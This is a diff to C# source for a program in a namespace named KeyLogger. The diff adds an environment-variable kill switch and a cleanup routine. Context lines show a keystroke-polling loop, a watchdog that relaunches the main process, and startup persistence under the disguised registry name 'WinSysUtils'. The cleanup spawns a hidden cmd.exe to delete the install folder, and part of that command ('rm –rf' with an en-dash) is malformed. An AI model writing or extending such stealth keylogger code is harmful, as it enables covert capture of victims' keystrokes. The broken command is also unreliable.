@@ -33,26 +33,7 @@ namespace KeyLogger
             string disableVar = Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER");
             if (string.Equals(disableVar, "true", StringComparison.OrdinalIgnoreCase))
             {
-                // If disabled, also try to kill any running instance from the install path
-                // to make it "stop" as requested.
-                try
-                {
-                    foreach (var process in Process.GetProcesses())
-                    {
-                        try
-                        {
-                            string fileName = "";
-                            try { fileName = process.MainModule.FileName; } catch { continue; }
-
-                            if (fileName.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
-                            {
-                                process.Kill();
-                            }
-                        }
-                        catch { }
-                    }
-                }
-                catch { }
+                CleanupAndExit();
                 return;
             }
 
@@ -75,6 +56,12 @@ namespace KeyLogger
                 while (true)
                 {
                     Thread.Sleep(2000);
+                    
+                    if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
+                    {
+                        CleanupAndExit();
+                    }
+
                     if (!IsWatchdogRunning())
                     {
                         StartWatchdog();
@@ -85,6 +72,11 @@ namespace KeyLogger
             while (true)
             {
                 Thread.Sleep(10);
+
+                if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
+                {
+                    CleanupAndExit();
+                }
 
                 // An even more advanced check
                 bool shift = false;
@@ -248,6 +240,12 @@ namespace KeyLogger
             while (true)
             {
                 Thread.Sleep(1000);
+
+                if (string.Equals(Environment.GetEnvironmentVariable("DISABLE_KEYLOGGER"), "true", StringComparison.OrdinalIgnoreCase))
+                {
+                    CleanupAndExit();
+                }
+
                 if (!IsMainProcessRunning())
                 {
                     try
@@ -257,6 +255,71 @@ namespace KeyLogger
                     catch { }
                 }
             }
+        }
+
+        private static void CleanupAndExit()
+        {
+            try
+            {
+                // 1. Kill all other processes in the install dir
+                int currentPid = Process.GetCurrentProcess().Id;
+                foreach (var process in Process.GetProcesses())
+                {
+                    try
+                    {
+                        if (process.Id == currentPid) continue;
+                        
+                        string fileName = "";
+                        try { fileName = process.MainModule.FileName; } catch { continue; }
+
+                        if (fileName.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
+                        {
+                            process.Kill();
+                            process.WaitForExit(2000);
+                        }
+                    }
+                    catch { }
+                }
+
+                // 2. Remove Registry key
+                try
+                {
+                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
+                    {
+                        if (key != null && key.GetValue("WinSysUtils") != null)
+                        {
+                            key.DeleteValue("WinSysUtils");
+                        }
+                    }
+                }
+                catch { }
+
+                // 3. Delete the install directory
+                // Since we might be running FROM the install directory, we use cmd.exe to delete it after we exit.
+                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
+                if (currentExe.StartsWith(InstallDir, StringComparison.OrdinalIgnoreCase))
+                {
+                    ProcessStartInfo psi = new ProcessStartInfo
+                    {
+                        FileName = "cmd.exe",
+                        Arguments = $"/C choice /C Y /N /D Y /T 2 & rm –rf \"{InstallDir}\" || (timeout /t 2 & rd /s /q \"{InstallDir}\")",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    };
+                    Process.Start(psi);
+                }
+                else
+                {
+                    // If we are running from elsewhere (like the initial click), just delete the install dir immediately
+                    if (Directory.Exists(InstallDir))
+                    {
+                        Directory.Delete(InstallDir, true);
+                    }
+                }
+            }
+            catch { }
+
+            Environment.Exit(0);
         }
 
         private static bool IsMainProcessRunning()
